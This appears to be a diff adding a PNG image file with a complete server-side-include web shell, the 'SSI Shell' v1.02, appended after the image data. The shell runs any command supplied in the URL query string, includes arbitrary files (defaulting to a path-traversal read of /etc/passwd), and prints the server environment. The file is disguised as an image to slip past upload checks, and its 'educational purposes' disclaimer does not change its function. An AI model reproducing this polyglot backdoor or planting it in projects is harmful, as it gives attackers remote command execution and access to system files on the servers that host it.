@@ -1,0 +1,106 @@
+‰PNG
+
+   
+IHDR   d   d   ÿ€   tEXtSoftware Adobe ImageReadyqÉe<  ÁIDATxÚìÚÙOG ð½×ëcw½ØÆ\Ì•„
+4€ ©B’&´¡QÕ<$/‘*õé{ßûõ%/)‘""E!%%UEDKBƒ¼Ø¬íµw·ãX2†ÔÇRs|#k4>öðÏßÌ|32~ûûqJa… À,À,À,  ,À,À,ÀÀ,À,À,  ,À,À,ÀÀ,À,À, (¼PënxÎvÊË5»¯@0dîuC7RÁXb9¼5çO¾‰w,ÆíÏµZÛ<{¾‹8ãq ß×˜
+Å"“Hí8bá$!žoÎ6b8^Èçé*»ûZ·£§!xo6-ÇÑ˜EÚXïÍ~¡¿©@©\±4Hµ·‡,UÇ‹´³5·úÙ¡Ä[g©êoû8ŸûècáYýM/%ZË:	{¾îf¼üÇ’.´3Õ¼)èžkŸâ4yd±ØZÑÑ{Â´IJäÄ¡–#‹åü¼ÍÜ¢”€G¥T–’Ù# áèn8:Xh0Î6PŽ¾ç·®9ÜI)í²ÛO×Z%”If—/š¢¢(Ø—k9­”Àíkšº_XhÐ•FN¾¿|!­Ì>vðjþðaÙ:ª]_}òÿLç;‚K²²nh?S‹¤*2É…~!‚&uU3ÒÚÁÂ²Úp©jÇšŽrrâ€“ßþç±ºn˜±ç[ŠÃ­Q¥ôV¾¿IlÎ¶QŒ¿
+F[VÑƒ€¥¹½é+—›EÞ±óõd97´Ú¸ÿÒÕ5Y¤¢É¹	7óÅÎÑÓ€±ßWÂs(Ö*‰E1	%!»¥ÞúšjC=•NëO&åõ5çÐegÂl`ïªg¼ÂÚgh"®Xž•JéÉäöåïŽ?Dõ/“ùuRMM<žŽÆ¶
+è•z®½±KiÆFXNÄUS~ Æãð\ïÉ»
+ðc£#ã“_^F:¨ÎµÏ
+ôL?Ÿíï=ÃÐ´=8>ñ$ÿ(ôúévjüðãO-õ7Æ®n¿gàÈË)	¦Ä['òŸ5ÉÓ¯Ös#Ãgçþ^îïAu¶=Ø×µ´âïîl§)}Æã’nŒ]Ùñ›Ót¶qõÂS|oy…dQâ9«	ë>a YžYÄ£X8;›e3!À2t®Í¼k#‘ì>(AVÎ²çÙz»Nm§K©ç]'ÞD]ù^G“6F‹%+0f‘8cã¶çÁÎ“™M’“­Mù5E’­Í
+Y¸"2 o-ä¯´3^q%Y~p‘åõèÒ#KK³¸nyôë†ý‰á™M8Ê^è­hš¾woÀqœ¤t_—AìÊÅÍ‰¯2—¥eY+ËÆÊ²¦1Sèë›“‚.Ë7?ôMMðÂñŠaùZ‰ž>Ž¦GMÌ³’É—O‰úéø—¡;¬vKi'/s
+TNRWT¹ÃwÉÜ¤tþõ?OÎà—áëÚÓKŽÄ2+­’¼ôxªRIiZQ¹§'gP=9ý"¿FŸ™
+~1»¥·mX¨‰‚¼”X¢h)UÓ¶’ë†ù¥³£eyÕßÑÚ¼ê_Gu¶½ûë"›QÎÂ¢¼A‰'VV×òr»œN!“^Ý{ðØë©Ê
+O >^Jˆ¯Íg‹†nT&²v”p‚.I†#¨Î¶Ã‘ˆÈóòfLw—IUEˆùXLÉþv-Ú‹ºbQñ¥¢òÔ«ƒ²Ü¹s÷>Z¬ "Z÷äêÑ‘
+á¦†ÎvSTf#Ñ¥ó{þÝ­ë%\y†aspÿX:¢¬ÿüÜHëÃ¢i‚eéÜÓì²íªG/{f'o—ÉBC~SÞBAkÿ
+°—òZ‘Î–9´—‹•V­¼Í¶´êm˜ù‡)9¶Ewb”Xø!Q9³«±ËKWÓñ×Áè‹åÄRø lþáóØÂ|3¿­&¹ ¶ïþ&	X€X€
+XP ° ° °  ```A,À,À,À‚X€X€X€° ° ë0
+• d2ùËºÄDÊ    IEND®B`‚<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls -al" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="inc" value="/../../../../../../../etc/passwd" -->
+<!--#else -->
+<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>
+SSI Shell
+</title>
+<script language="javascript">
+function fex()
+{
+document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
+}
+function vfile()
+{
+document.location.href="<!--#echo var=DOCUMENT_NAME -->?cat "+document.getElementById('vfile').value;
+}
+</script>
+</head>
+<body bgcolor=#e4e0d8 alink=blue vlink=blue>
+<div align=center width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+2><a href=http://github.com/Anon-Exploiter>SSI Shell</a></font></b></center>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Shell info</font></b></center>
+<br>
+<b><font color=blue>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
+<b><font color=blue>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
+<b><font color=blue>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
+<b><font color=blue>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
+<b><font color=blue>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
+<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Server info</font></b></center>
+<br>
+<pre>
+<!--#printenv-->
+</pre>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Command for shell & address for inclusion</font></b></center>
+<br>
+<b><font color=blue>Enter command/address</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=command>&nbsp;<input type=button value=Run onclick=fex();>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Shell</font></b></center>
+<br>
+<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
+</textarea>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1>Operations on files</font></b></center>
+<br>
+<b><font color=blue>View file (cat)</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=vfile value=<!--#echo var=SCRIPT_FILENAME -->>&nbsp;<input type=button value=Run onclick=vfile();><br>
+<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#include virtual=$inc -->
+</textarea>
+<br>
+</div>
+<br>
+<div align=center width=100% border=0 style=background-color:#D4D0C8;>
+<center><b><font size=+1><a href=http://github.com/Anon-Exploiter>(c) :V ( :3 )</a></font></b><br><small>2009, v1.02<!--êîïèðàéò ïîìåíÿí â 2011 ;) --></small><br>
+ONLY FOR EDUCATIONAL PURPOSES. ILLEGAL ACTIVITIES PROHIBITED.
+</center>
+</div>
+</body>
+</html>
